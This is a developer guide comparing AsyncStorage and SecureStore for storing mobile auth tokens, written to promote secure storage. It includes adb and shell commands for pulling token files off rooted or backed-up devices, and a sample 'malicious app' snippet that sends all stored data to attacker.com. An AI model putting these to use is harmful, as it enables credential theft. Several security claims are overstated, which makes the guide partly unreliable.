# AsyncStorage vs SecureStore: Security Comparison

## 🔐 Why Secure Storage Matters

When storing sensitive data like authentication tokens, API keys, or user credentials in a mobile app, you have two main options:
- **AsyncStorage** - Simple key-value storage (NOT secure)
- **SecureStore** - Encrypted keychain/keystore storage (SECURE)

**Always use SecureStore for sensitive data!**

---

## 📦 What is AsyncStorage?

### How It Works

AsyncStorage is React Native's simple, unencrypted key-value storage system.

```javascript
import AsyncStorage from '@react-native-async-storage/async-storage';

// Store data
await AsyncStorage.setItem('authToken', 'my-secret-token');

// Retrieve data
const token = await AsyncStorage.getItem('authToken');
```

### Storage Location

**iOS:**
- Stored in: `Library/Preferences/[AppBundleID].plist`
- Format: XML plist file (plain text)
- Location: App's sandbox directory

**Android:**
- Stored in: SQLite database or SharedPreferences
- Format: Plain text in database files
- Location: `/data/data/[package-name]/shared_prefs/`

### Security Characteristics

❌ **NOT Encrypted** - Data is stored in plain text  
❌ **No Access Control** - Anyone with device access can read it  
❌ **No Biometric Protection** - Doesn't require authentication  
❌ **Easy to Extract** - Simple file system access  
❌ **Backup Vulnerable** - Included in device backups (unencrypted)  

---

## 🔒 What is SecureStore?

### How It Works

SecureStore (expo-secure-store) uses the device's native secure storage systems:

```javascript
import * as SecureStore from 'expo-secure-store';

// Store data securely
await SecureStore.setItemAsync('authToken', 'my-secret-token');

// Retrieve data securely
const token = await SecureStore.getItemAsync('authToken');
```

### Storage Location

**iOS:**
- Uses: **Keychain Services**
- Format: Encrypted by iOS Keychain
- Location: System-level secure storage
- Protection: Hardware-backed encryption

**Android:**
- Uses: **Android Keystore System**
- Format: Encrypted by Android Keystore
- Location: Hardware Security Module (HSM) or software keystore
- Protection: Hardware-backed encryption (when available)

### Security Characteristics

✅ **Encrypted** - Data is encrypted using device keys  
✅ **Access Control** - Requires device authentication  
✅ **Biometric Protection** - Can require fingerprint/face ID  
✅ **Hard to Extract** - Requires root/jailbreak + specialized tools  
✅ **Backup Safe** - Encrypted in device backups  
✅ **Hardware-Backed** - Uses secure hardware when available  

---

## 🚨 Why AsyncStorage is Vulnerable to Theft

### Scenario: Phone Theft

When someone steals your phone, they can access AsyncStorage data in multiple ways:

### 1. **Physical Access Without Unlocking**

**iOS:**
- If the device is jailbroken, attackers can access the file system
- Even without jailbreak, if the device is unlocked, files are accessible
- Backup files contain AsyncStorage data in plain text

**Android:**
- If USB debugging is enabled, attackers can use `adb` to access files
- Rooted devices allow direct file system access
- Backup files contain unencrypted data

### 2. **File System Access**

**How Attackers Extract Data:**

```bash
# iOS (jailbroken or via backup)
# Navigate to app's directory
cd /var/mobile/Containers/Data/Application/[AppUUID]/
# Read the plist file
cat Library/Preferences/com.yourapp.bundleid.plist

# Android (rooted or via backup)
# Access SharedPreferences
adb shell
run-as com.yourapp
cat shared_prefs/[prefs-file].xml
```

**Result:** They get your tokens in plain text!

### 3. **Backup Extraction**

**iOS Backup:**
- iTunes/iCloud backups contain app data
- AsyncStorage files are included unencrypted
- Attackers can restore backup to another device and extract data

**Android Backup:**
- ADB backups include SharedPreferences
- Unencrypted by default
- Easy to extract with tools like `abe` (Android Backup Extractor)

### 4. **Malware/Compromised Apps**

- Malicious apps with file system permissions can read AsyncStorage
- No encryption means no protection against other apps
- Easy to extract with simple file reading

---

## 🛡️ Why SecureStore Protects Against Theft

### 1. **Hardware Encryption**

**iOS Keychain:**
- Encrypted using device's unique encryption key
- Key is stored in Secure Enclave (hardware chip)
- Cannot be extracted even with physical access

**Android Keystore:**
- Uses hardware-backed encryption when available
- Keys stored in Trusted Execution Environment (TEE)
- Requires device authentication to access

### 2. **Access Control**

SecureStore requires:
- Device passcode/PIN
- Biometric authentication (fingerprint/face ID)
- App-specific access controls

**Even if someone steals your phone:**
- They need to unlock the device first
- They need to authenticate to access SecureStore
- Without authentication, data is inaccessible

### 3. **Backup Protection**

**iOS:**
- Keychain data is encrypted in backups
- Requires keychain password to restore
- Cannot be extracted without authentication

**Android:**
- Keystore data is hardware-protected
- Not included in standard backups
- Requires device authentication

### 4. **Root/Jailbreak Resistance**

Even if a device is rooted/jailbroken:
- Keychain/Keystore encryption keys are hardware-protected
- Cannot be extracted without device unlock
- Requires specialized forensic tools (and even then, difficult)

---

## 📊 Side-by-Side Comparison

| Feature | AsyncStorage | SecureStore |
|---------|-------------|-------------|
| **Encryption** | ❌ None | ✅ Hardware-backed |
| **Access Control** | ❌ None | ✅ Biometric/PIN |
| **Theft Protection** | ❌ Vulnerable | ✅ Protected |
| **Backup Security** | ❌ Unencrypted | ✅ Encrypted |
| **Root/Jailbreak Safe** | ❌ No | ✅ Yes |
| **Performance** | ✅ Fast | ⚠️ Slightly slower |
| **Ease of Use** | ✅ Simple | ✅ Simple |
| **Storage Limit** | ✅ Large (MB) | ⚠️ Small (KB) |
| **Use Case** | Non-sensitive data | Sensitive tokens/keys |

---

## 🎯 Real-World Attack Scenarios

### Scenario 1: Lost Phone

**With AsyncStorage:**
1. Attacker finds your phone
2. If unlocked (or they guess PIN), they can:
   - Connect to computer
   - Extract app data files
   - Read your auth tokens in plain text
   - Access your account

**With SecureStore:**
1. Attacker finds your phone
2. Even if unlocked, they need:
   - Biometric authentication OR
   - Device passcode
3. Without authentication, tokens are encrypted and inaccessible
4. Your account remains secure

### Scenario 2: Malicious App

**With AsyncStorage:**
1. Malicious app requests file system permissions
2. App reads AsyncStorage files
3. Extracts your tokens
4. Sends tokens to attacker's server

**With SecureStore:**
1. Malicious app cannot access SecureStore
2. Each app has isolated keychain/keystore access
3. Tokens remain protected
4. Attack fails

### Scenario 3: Device Backup

**With AsyncStorage:**
1. Attacker gains access to your backup file
2. Extracts app data from backup
3. Reads AsyncStorage files (unencrypted)
4. Gets your tokens

**With SecureStore:**
1. Attacker gains access to your backup file
2. Keychain/Keystore data is encrypted
3. Requires keychain password/device authentication
4. Tokens remain protected

---

## 🔍 How Attackers Extract AsyncStorage Data

### Method 1: Direct File Access (Rooted/Jailbroken)

```bash
# Android
adb shell
su
cd /data/data/com.yourapp/shared_prefs/
cat *.xml

# iOS (jailbroken)
ssh into device
cd /var/mobile/Containers/Data/Application/[UUID]/
cat Library/Preferences/*.plist
```

**Time to extract:** < 5 minutes  
**Difficulty:** Easy (if device is rooted/jailbroken)

### Method 2: Backup Extraction

```bash
# Android
adb backup -f backup.ab com.yourapp
# Extract with Android Backup Extractor
java -jar abe.jar unpack backup.ab backup.tar
tar -xf backup.tar
# Read SharedPreferences files

# iOS
# Use iTunes backup or iCloud backup
# Extract with tools like iBackupBot
# Navigate to app's plist files
```

**Time to extract:** 10-30 minutes  
**Difficulty:** Medium

### Method 3: Malware

```javascript
// Malicious app code
import AsyncStorage from '@react-native-async-storage/async-storage';

// Read all AsyncStorage data
const getAllKeys = await AsyncStorage.getAllKeys();
const allData = await AsyncStorage.multiGet(getAllKeys);

// Send to attacker's server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(allData)
});
```

**Time to extract:** Automatic  
**Difficulty:** Easy (if app has permissions)

---

## ✅ Best Practices

### Use SecureStore For:

✅ Authentication tokens (JWT, session tokens)  
✅ API keys and secrets  
✅ User passwords (though prefer not storing)  
✅ Credit card numbers (PCI compliance)  
✅ Personal identification numbers (PINs)  
✅ Encryption keys  
✅ Any sensitive user data  

### Use AsyncStorage For:

✅ User preferences (theme, language)  
✅ App settings (notifications, sounds)  
✅ Cache data (non-sensitive)  
✅ Offline data (public content)  
✅ UI state (filters, sort options)  
✅ Non-sensitive configuration  

### Code Example: Proper Usage

```javascript
// ✅ CORRECT: Store auth token securely
import { saveAuthToken, getAuthToken } from '../utils/secureStorage';

// Login
const response = await login(username, password);
await saveAuthToken(response.token); // Secure!

// Make authenticated request
const token = await getAuthToken();
fetch('/api/protected', {
  headers: { Authorization: `Bearer ${token}` }
});

// ❌ WRONG: Don't use AsyncStorage for tokens
import AsyncStorage from '@react-native-async-storage/async-storage';
await AsyncStorage.setItem('authToken', response.token); // Insecure!
```

---

## 🧪 Testing Security

### Test AsyncStorage Vulnerability

```javascript
// This is how easy it is to read AsyncStorage
import AsyncStorage from '@react-native-async-storage/async-storage';

// Get all stored data
const keys = await AsyncStorage.getAllKeys();
const allData = await AsyncStorage.multiGet(keys);
console.log('All AsyncStorage data:', allData);
// ⚠️ Anyone can do this!
```

### Test SecureStore Protection

```javascript
// SecureStore requires proper access
import * as SecureStore from 'expo-secure-store';

try {
  const token = await SecureStore.getItemAsync('authToken');
  // ✅ Only accessible with device authentication
} catch (error) {
  // ❌ Access denied without authentication
}
```

---

## 📚 Additional Resources

- [OWASP Mobile Security](https://owasp.org/www-project-mobile-security/)
- [iOS Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [Android Keystore System](https://developer.android.com/training/articles/keystore)
- [expo-secure-store Documentation](https://docs.expo.dev/versions/latest/sdk/securestore/)

---

## 🎓 Key Takeaways

1. **AsyncStorage = Plain Text Storage**
   - No encryption
   - Easy to extract
   - Vulnerable to theft

2. **SecureStore = Encrypted Storage**
   - Hardware-backed encryption
   - Requires authentication
   - Protects against theft

3. **Always Use SecureStore for Tokens**
   - Authentication tokens
   - API keys
   - Sensitive credentials

4. **AsyncStorage is Fine for Non-Sensitive Data**
   - User preferences
   - App settings
   - Cache data

**Remember:** If data is sensitive, use SecureStore. If it's not sensitive, AsyncStorage is fine. When in doubt, use SecureStore! 🔒
